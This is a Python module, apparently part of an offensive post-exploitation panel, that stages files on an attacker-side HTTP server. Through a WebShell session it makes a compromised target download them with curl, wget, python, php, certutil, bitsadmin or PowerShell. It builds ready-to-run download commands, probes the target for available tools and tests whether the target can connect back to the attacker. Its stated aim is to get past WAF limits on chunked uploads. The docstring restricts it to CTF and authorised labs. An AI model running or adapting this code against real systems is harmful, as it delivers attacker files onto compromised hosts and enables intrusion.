"""文件暂存 HTTP 拉取通道：攻击机起临时 HTTP 服务，目标机用 curl/wget 等自取。

为什么需要它：分片 base64 上传要经 WebShell 通道逐块往返，长链路/大文件下容易
超时、被 WAF 截断或单参数长度受限；改成「目标机主动下载」只需一次 HTTP 拉取，
下载完再按字节数校验，失败能如实报错并自动换下一个可用工具。

设计要点：
- 暂存服务只服务 ``/s/<token>/<name>`` 形式的随机 token 路径，无目录列举，
  条目默认 15 分钟过期（可在 add 时覆盖），面板退出时整体清空；
- 工具探测与下载全部经 SessionBase.exec 在目标侧真实执行，解析真实回显；
- 下载是否成功不靠工具回显，一律用目标侧真实文件大小与暂存字节数比对；
- 该服务需要目标机能回连攻击机，因此监听地址默认 0.0.0.0（面板自身仍只监听
  127.0.0.1）；仅用于 CTF / 授权靶场 / 教学，禁止对未授权真实目标使用。
"""

from __future__ import annotations

import logging
import re
import secrets
import shutil
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlparse

from .. import config
from ..session.base import SessionBase, SessionError

log = logging.getLogger("pivothub.filestage")

#: 工具偏好顺序（探测结果按此排序，下载也按此逐个尝试）
TOOLS_BY_PLATFORM: dict[str, tuple[str, ...]] = {
    "linux": ("curl", "wget", "python3", "python", "busybox", "php"),
    "windows": ("curl", "certutil", "powershell", "bitsadmin"),
}

TOOL_LABELS = {
    "curl": "curl",
    "wget": "wget",
    "python3": "python3",
    "python": "python",
    "busybox": "busybox wget",
    "php": "php",
    "certutil": "certutil",
    "powershell": "PowerShell",
    "bitsadmin": "bitsadmin",
}

#: 目标侧工具探测：输出 PIVOTHUB_HAVE:<tool> 行（不依赖具体 shell 方言）
DETECT_CMDS = {
    "linux": ("for c in curl wget python3 python busybox php; do "
              "command -v $c >/dev/null 2>&1 && echo PIVOTHUB_HAVE:$c; done"),
    "windows": ('powershell -NoP -NonI -Command "'
                "foreach($c in 'curl','certutil','powershell','bitsadmin'){"
                "if(Get-Command $c -ErrorAction SilentlyContinue){"
                "Write-Output ('PIVOTHUB_HAVE:'+$c)}}\""),
}


# ---------------------------------------------------------------------------
# 路径 / 引号处理
# ---------------------------------------------------------------------------

def _safe_name(name: str) -> str:
    """URL 里使用的 ASCII 文件名（目标侧落盘名不受影响）。"""
    base = Path(name or "").name or "file.bin"
    base = re.sub(r"[^A-Za-z0-9._-]", "_", base).strip("._") or "file.bin"
    return base[:80]


def _shq(s: str) -> str:
    """POSIX 单引号转义（含换行也安全）。"""
    return "'" + str(s).replace("'", "'\\''") + "'"


def _psq(s: str) -> str:
    """PowerShell 单引号字符串转义。"""
    return "'" + str(s).replace("'", "''") + "'"


def _winq(s: str) -> str:
    """cmd 双引号参数：含双引号或换行时无法安全表达，直接拒绝。"""
    s = str(s)
    if '"' in s or "\n" in s or "\r" in s:
        raise SessionError(f"路径含非法字符，无法构造下载命令: {s!r}")
    return '"' + s + '"'


def _check_path(path: str) -> None:
    if "\n" in path or "\r" in path or "\x00" in path:
        raise SessionError("路径含换行/空字符，无法构造下载命令")


# ---------------------------------------------------------------------------
# 下载命令构造
# ---------------------------------------------------------------------------

def build_cmd(tool: str, platform: str, url: str, path: str, timeout: float = 300.0) -> str:
    """按工具与平台构造目标侧下载命令（仅下载，不掺退出码解析）。"""
    _check_path(path)
    platform = "windows" if platform == "windows" else "linux"
    if platform not in TOOLS_BY_PLATFORM or tool not in TOOLS_BY_PLATFORM[platform]:
        raise SessionError(f"平台 {platform} 不支持下载工具: {tool}")
    if platform == "linux":
        qp, qu = _shq(path), _shq(url)
        max_time = max(30, int(timeout * 0.9))
        table = {
            "curl": f"curl -fsSL --connect-timeout 10 --max-time {max_time} -o {qp} {qu}",
            "wget": f"wget -q -T 15 -t 2 --max-redirect=5 -O {qp} {qu}",
            "python3": (f"PIVOTHUB_URL={qu} PIVOTHUB_PATH={qp} python3 -c "
                        '"import os,urllib.request;urllib.request.urlretrieve('
                        "os.environ['PIVOTHUB_URL'],os.environ['PIVOTHUB_PATH'])\""),
            "python": (f"PIVOTHUB_URL={qu} PIVOTHUB_PATH={qp} python -c "
                       '"import os,urllib.request;urllib.request.urlretrieve('
                       "os.environ['PIVOTHUB_URL'],os.environ['PIVOTHUB_PATH'])\""),
            "busybox": f"busybox wget -q -O {qp} {qu}",
            "php": (f"PIVOTHUB_URL={qu} PIVOTHUB_PATH={qp} php -r "
                    "\"copy(getenv('PIVOTHUB_URL'),getenv('PIVOTHUB_PATH'));\""),
        }
        return table[tool]
    qp, qu = _winq(path), _winq(url)
    max_time = max(30, int(timeout * 0.9))
    table = {
        "curl": f'curl.exe -fsSL --connect-timeout 10 --max-time {max_time} -o {qp} {qu}',
        "certutil": f"certutil -urlcache -split -f {qu} {qp}",
        "powershell": ("powershell -NoP -NonI -Command "
                       f"\"Invoke-WebRequest -Uri {_psq(url)} -OutFile {_psq(path)} "
                       "-UseBasicParsing\""),
        "bitsadmin": f"bitsadmin /transfer pivothub /download /priority normal {qu} {qp}",
    }
    return table[tool]


def build_verify_cmd(path: str, platform: str) -> str:
    """目标侧取文件字节数的命令（Linux 优先 stat，Windows 用 PowerShell）。"""
    _check_path(path)
    if platform == "windows":
        q = _psq(path)
        return ("powershell -NoP -NonI -Command "
                f"\"if(Test-Path -LiteralPath {q}){{(Get-Item -LiteralPath {q}).Length}}"
                "else{'PIVOTHUB_NOFILE'}\"")
    q = _shq(path)
    return f"stat -c %s {q} 2>/dev/null || wc -c < {q} 2>/dev/null"


def _platform_of(sess: SessionBase) -> str:
    return "windows" if getattr(sess, "platform", "linux") == "windows" else "linux"


def stage_host(db, project_id: str, shell, sess) -> str:
    """目标机下载时应访问的攻击机地址。

    优先项目里显式配置的「攻击机网络」；未配置且目标本身是回环地址（本机联调靶）
    时用 127.0.0.1；其余回落到基线默认值。文件管理与资产探测（扫描器上传）共用。
    """
    from ..db import get_attack
    from ..models import Project

    project = db.get(Project, project_id)
    cfg = (project.settings or {}).get("attack") if project is not None else None
    if cfg and cfg.get("ip"):
        return str(cfg["ip"])
    url = (getattr(shell, "url", "") or "").lower()
    if "127.0.0.1" in url or "localhost" in url:
        return "127.0.0.1"
    return str((get_attack(db, project_id) or {}).get("ip") or "127.0.0.1")


def detect_tools(sess: SessionBase) -> list[str]:
    """目标侧真实探测可用下载工具（按偏好顺序返回，可能为空）。"""
    platform = _platform_of(sess)
    try:
        res = sess.exec(DETECT_CMDS[platform], timeout=25)
    except SessionError as e:
        log.info("下载工具探测失败: %s", e)
        return []
    out = (res.output or "") + "\n" + (res.error or "")
    lines = {ln.strip() for ln in out.splitlines()}
    return [t for t in TOOLS_BY_PLATFORM[platform] if f"PIVOTHUB_HAVE:{t}" in lines]


def _file_size(sess: SessionBase, path: str, platform: str, timeout: float = 30.0) -> int | None:
    try:
        res = sess.exec(build_verify_cmd(path, platform), timeout=timeout)
    except SessionError:
        return None
    nums = re.findall(r"\d+", (res.output or "") + "\n" + (res.error or ""))
    return int(nums[-1]) if nums else None


def can_reach(sess: SessionBase, host: str, port: int, timeout: float = 12.0) -> bool:
    """目标机能否 TCP 连到攻击机指定端口（HTTP 拉取的前置检查）。

    没有这道检查时，目标不通攻击机会让 curl/certutil/powershell/bitsadmin 逐个
    长超时（certutil / Invoke-WebRequest 本身没有超时参数）——实测能挂几分钟。
    """
    from .probe import _cmd_tcp, _parse

    if not host or not port:
        return False
    platform = "windows" if getattr(sess, "platform", "linux") == "windows" else "linux"
    try:
        res = sess.exec(_cmd_tcp(str(host), int(port), platform), timeout=timeout)
    except (SessionError, OSError):
        return False
    ok, _ = _parse("TCP", (res.output or "") + "\n" + (res.error or ""))
    return bool(ok)


@dataclass
class PullResult:
    ok: bool = False
    tool: str = ""
    size: int = 0
    expected: int = 0
    url: str = ""
    cmd: str = ""
    log: list[str] = field(default_factory=list)
    reason: str = ""

    def to_dict(self) -> dict:
        return {"ok": self.ok, "tool": self.tool, "size": self.size, "expected": self.expected,
                "url": self.url, "cmd": self.cmd, "log": self.log, "reason": self.reason}


def pull_file(sess: SessionBase, url: str, target_path: str, expected: int, *,
              platform: str | None = None, tools: list[str] | None = None,
              timeout: float = 300.0, max_tools: int = 0,
              per_timeout: float | None = None) -> PullResult:
    """在目标侧依次尝试下载工具，并用真实文件大小校验；全失败如实返回。

    - ``timeout``：单次下载在**目标侧**的允许耗时（命令自身的 --max-time 由此推导）；
    - ``per_timeout``：会话层等待上限，默认取 timeout（长下载不会被过早打断）；
    - ``max_tools``：最多尝试几个工具（0=全部）。**必须给非零值**时要清楚：没有
      超时参数的工具（certutil / Invoke-WebRequest / bitsadmin）在目标不通时会
      各自挂很久，自动流程应把尝试次数压到 1–2 个。
    """
    platform = platform or _platform_of(sess)
    order = [t for t in (tools if tools is not None else list(TOOLS_BY_PLATFORM[platform]))
             if t in TOOLS_BY_PLATFORM.get(platform, ())]
    if max_tools > 0:
        order = order[:max_tools]
    result = PullResult(expected=expected, url=url)
    if not order:
        result.reason = "目标机未检测到可用的下载工具（curl/wget/python3 等）"
        return result
    wait = float(per_timeout if per_timeout is not None else timeout)

    for tool in order:
        try:
            cmd = build_cmd(tool, platform, url, target_path, timeout=timeout)
        except SessionError as e:
            result.log.append(f"[{tool}] 命令构造失败：{e}")
            continue
        result.log.append(f"[{tool}] {cmd}")
        try:
            res = sess.exec(cmd, timeout=wait)
        except SessionError as e:
            result.log.append(f"[{tool}] 执行失败：{e}")
            continue
        out = (res.output or "").strip()
        if out:
            result.log.append(f"[{tool}] 回显：{out[-400:]}")
        if res.timed_out:
            result.log.append(f"[{tool}] 目标侧执行超时（>{int(timeout)}s）")
            continue
        size = _file_size(sess, target_path, platform)
        if size == expected:
            result.ok, result.tool, result.size, result.cmd = True, tool, size, cmd
            result.log.append(f"[{tool}] 校验通过：{size} 字节")
            return result
        if size is None:
            result.log.append(f"[{tool}] 未取到目标侧文件大小（下载可能未落盘）")
        else:
            result.log.append(f"[{tool}] 大小不一致：目标 {size} 字节 / 期望 {expected} 字节，换下一个工具")
    result.reason = (f"目标机 HTTP 拉取失败（已尝试：{'/'.join(order)}）；"
                     "请确认目标可回连攻击机，或改用分片直传")
    return result


# ---------------------------------------------------------------------------
# 暂存 HTTP 服务
# ---------------------------------------------------------------------------

@dataclass
class StagedFile:
    token: str
    name: str
    path: Path
    size: int
    created: float
    expires: float
    hits: int = 0
    last_hit: float = 0.0

    def to_dict(self) -> dict:
        fmt = lambda ts: datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S") if ts else ""
        return {"token": self.token, "name": self.name, "size": self.size,
                "created": fmt(self.created), "expires": fmt(self.expires),
                "hits": self.hits, "lastHit": fmt(self.last_hit)}


class _Handler(BaseHTTPRequestHandler):
    server_version = "PivotHubStage/1.0"
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):  # noqa: A003 - 基类签名
        log.debug("stage %s %s", self.address_string(), fmt % args)

    def do_GET(self):  # noqa: N802 - 基类签名
        self._serve(head=False)

    def do_HEAD(self):  # noqa: N802 - 基类签名
        self._serve(head=True)

    def _serve(self, head: bool) -> None:
        parts = [p for p in urlparse(self.path).path.split("/") if p]
        item = self.server.stage.touch(parts[1]) if len(parts) >= 2 and parts[0] == "s" else None
        if item is None:
            self._send(404, b"not found")
            return
        try:
            with open(item.path, "rb") as fh:
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(item.size))
                self.send_header("Content-Disposition",
                                 f'attachment; filename="{item.name}"')
                self.end_headers()
                if not head:
                    shutil.copyfileobj(fh, self.wfile, length=256 * 1024)
        except (OSError, BrokenPipeError, ConnectionResetError):
            log.debug("暂存文件发送中断: %s", item.name)

    def _send(self, code: int, body: bytes) -> None:
        try:
            self.send_response(code)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if body:
                self.wfile.write(body)
        except (OSError, BrokenPipeError, ConnectionResetError):
            pass


class _StageHTTPServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, addr, handler, stage: "FileStageServer"):
        super().__init__(addr, handler)
        self.stage = stage


class FileStageServer:
    """攻击机侧临时文件暂存服务（懒启动，可显式停止）。"""

    def __init__(self, bind: str | None = None, port: int | None = None,
                 ttl: int | None = None, directory: Path | None = None) -> None:
        self.bind = config.STAGE_BIND if bind is None else bind
        self.port = config.STAGE_PORT if port is None else port
        self.ttl = config.STAGE_TTL if ttl is None else ttl
        self.directory = Path(directory) if directory else config.STAGE_DIR
        self._lock = threading.RLock()
        self._items: dict[str, StagedFile] = {}
        self._srv: _StageHTTPServer | None = None
        self._cleaner: threading.Thread | None = None

    # ---- 生命周期 ----

    @property
    def running(self) -> bool:
        return self._srv is not None

    @property
    def bound_port(self) -> int:
        return self._srv.server_address[1] if self._srv else 0

    def start(self) -> int:
        with self._lock:
            if self._srv is not None:
                return self.bound_port
            self.directory.mkdir(parents=True, exist_ok=True)
            srv = _StageHTTPServer((self.bind, self.port), _Handler, self)
            self._srv = srv
            threading.Thread(target=srv.serve_forever, name="pivothub-stage",
                             daemon=True).start()
            self._cleaner = threading.Thread(target=self._clean_loop, name="pivothub-stage-clean",
                                             daemon=True)
            self._cleaner.start()
            log.info("文件暂存服务已启动: http://%s:%d/s/<token>/<name>",
                     self.bind, self.bound_port)
            return self.bound_port

    def stop(self) -> None:
        with self._lock:
            srv, self._srv = self._srv, None
            items = list(self._items.values())
            self._items.clear()
        if srv is not None:
            try:
                srv.shutdown()
                srv.server_close()
            except Exception:  # pragma: no cover - 停止失败不应影响退出
                log.debug("暂存服务停止异常", exc_info=True)
        for item in items:
            _unlink(item.path)
        if srv is not None:
            log.info("文件暂存服务已停止（清理 %d 个暂存文件）", len(items))

    # ---- 暂存条目 ----

    def add(self, name: str, data: bytes, ttl: int | None = None) -> StagedFile:
        self.start()
        token = secrets.token_urlsafe(24)
        safe = _safe_name(name)
        path = self.directory / f"{token[:12]}-{safe}"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        now = time.time()
        item = StagedFile(token=token, name=safe, path=path, size=len(data), created=now,
                          expires=now + (self.ttl if ttl is None else ttl))
        with self._lock:
            self._sweep_locked(now)
            self._items[token] = item
        return item

    def get(self, token: str) -> StagedFile | None:
        with self._lock:
            self._sweep_locked(time.time())
            return self._items.get(token)

    def touch(self, token: str) -> StagedFile | None:
        item = self.get(token)
        if item is not None:
            item.hits += 1
            item.last_hit = time.time()
        return item

    def drop(self, token: str) -> bool:
        with self._lock:
            item = self._items.pop(token, None)
        if item is None:
            return False
        _unlink(item.path)
        return True

    def items(self) -> list[StagedFile]:
        with self._lock:
            self._sweep_locked(time.time())
            return sorted(self._items.values(), key=lambda x: x.created)

    def snapshot(self) -> dict:
        return {"running": self.running, "bind": self.bind, "port": self.bound_port,
                "ttl": self.ttl, "items": [i.to_dict() for i in self.items()]}

    # ---- 内部 ----

    def _sweep_locked(self, now: float) -> None:
        expired = [t for t, i in self._items.items() if i.expires <= now]
        for token in expired:
            _unlink(self._items.pop(token).path)

    def _clean_loop(self) -> None:
        while True:
            time.sleep(60)
            if not self.running:
                return
            with self._lock:
                self._sweep_locked(time.time())


def _unlink(path: Path) -> None:
    try:
        path.unlink(missing_ok=True)
    except OSError:  # pragma: no cover - Windows 上偶发占用
        log.debug("暂存文件删除失败: %s", path)


#: 进程内单例：面板整个生命周期共用
STAGE = FileStageServer()
